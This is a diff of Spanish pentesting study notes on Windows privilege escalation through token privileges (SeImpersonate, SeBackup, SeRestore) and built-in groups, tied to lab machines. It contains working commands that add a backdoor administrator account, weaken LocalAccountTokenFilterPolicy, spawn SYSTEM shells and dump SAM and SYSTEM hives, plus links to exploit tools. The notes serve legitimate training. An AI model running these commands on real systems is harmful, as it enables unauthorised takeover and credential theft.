@@ -130,15 +130,24 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 	whoami /priv
 	```
 ### SeImpersonate Privilege 
-- Nos permite escalar privilegios con Printspoofer, sigma potato
+- `SigmaPotato`
 	```powershell
-	# sigmapotato
 	.\sigmapotato.exe "net user an0nio Password123 /add"	
-	.\sigmapotato.exe "net localgroup Administrators an0nio /add "
-	# printspoofer
-	.\PrintSpoofer.exe -i -c "powershell"
+	.\sigmapotato.exe "net localgroup Administrators an0nio /add"
+	# Evitar restricciones con LocalAccountTokenFilterPolicy, -> permite impacket-psexec
+	.\sigmapotato.exe "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
 	```
-
+- `PrintSpoofer`
+	```powershell
+	.\PrintSpoofer.exe -i -c "powershell"	
+	```
+- `GodPotato` - [github](https://github.com/BeichenDream/GodPotato/releases)
+	```powershell
+	# Hay que hacer la siguiente petición para saber qué potato elegir, luego funciona como sigmapotato
+	reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+	```
+- `JuicyPotato` - [github](https://github.com/antonioCoco/JuicyPotatoNG?tab=readme-ov-file)
+- `RoguePotato` - [github](https://github.com/antonioCoco/RoguePotato)
 ### SeDebugPrivilege
 - Por una parte podemos activar mimikatz con `privilege::debug`, lo cual nos permite volcar LSASS, SAM (podríamos intentar volcar de forma [[Credenciales en Windows#Obtener lsass.dmp| menos automática]] si no funciona, ya que tenemos permisos)
 - RCE como system con `psgetsys.ps1`
@@ -165,6 +174,10 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 	# Agregar permisos completos al usuario (en este caso htb-student)
 	icacls "C:\TakeOwn\flag.txt" /grant htb-student:F
 	```
+### SeManageVolumePrivilege
+- Se puede explotar con la [siguiente herramienta](https://github.com/Greenwolf/ntlm_theft), tal y como se ve en el [la máquina access de proving grounds](https://medium.com/@Dpsypher/proving-grounds-practice-access-b95d3146cfe9)
+### SeRestorePrivilege
+- Se puede explotar con la [siguiente herramienta](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe), visto en la máquina [vaut de proving grounds](https://medium.com/@Dpsypher/proving-grounds-practice-vault-158516460860)
 
 ## Grupos integrados de Windows
 ### Pertenencia a alguno de los grupos
@@ -213,12 +226,11 @@ El grupo `Backup Operators` es **local**, no de dominio y `SeBackupPrivilege` no
 - Una vez está activado, ya podemos copiar cualquier archivo protegido
 	```powershell
 	Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt ..\svc_backup\flag.txt
-	# Si estuviéramos en un DC...
-	Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 	# También podríamos volcar la SAM 
 	reg.exe save hklm\sam C:\Users\public\sam.save
 	reg.exe save hklm\system C:\Users\public\system.save
 	```
+- Si estuviéramos en un DC, podríamos volcar `NTDS.dit` siguiendo [estas instrucciones](https://github.com/k4sth4/SeBackupPrivilege). El ejemplo completo aparece en la máquina Zeus de offsec
 ### Event log readers
 Nos permite acceder a los logs del sistema
 - Pertenencia al grupo
